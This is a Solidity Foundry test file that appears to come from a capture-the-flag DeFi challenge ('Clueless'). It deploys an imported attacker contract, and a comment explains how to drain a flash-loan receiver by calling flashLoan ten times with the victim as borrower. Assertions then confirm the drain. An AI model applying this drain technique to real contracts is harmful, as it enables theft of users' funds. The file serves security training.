// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/CluelessFixture.sol";

import "src/src-default/clueless/AttackClueless.sol";

contract CluelessTest is CluelessFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_clueless() public {

        // Act as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
         /*
            ---- We need to drain all funds from the user contract, in one transaction ----
            Since the flashLoan function lets to pass the borrower address, we can call it 10 times (1 ether / call) to drain all receiver funds.
            However, we are supposed to do it in a single transaction so we have to do it from an attacker contract (on its constructor)
        */
        AttackClueless atackClueless = new AttackClueless(address(pool), address(receiver));

        // Stop acting like the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The receiver got drained.
        assertEq(address(receiver).balance, 0);
        // The receiver balance got drained to the pool.
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}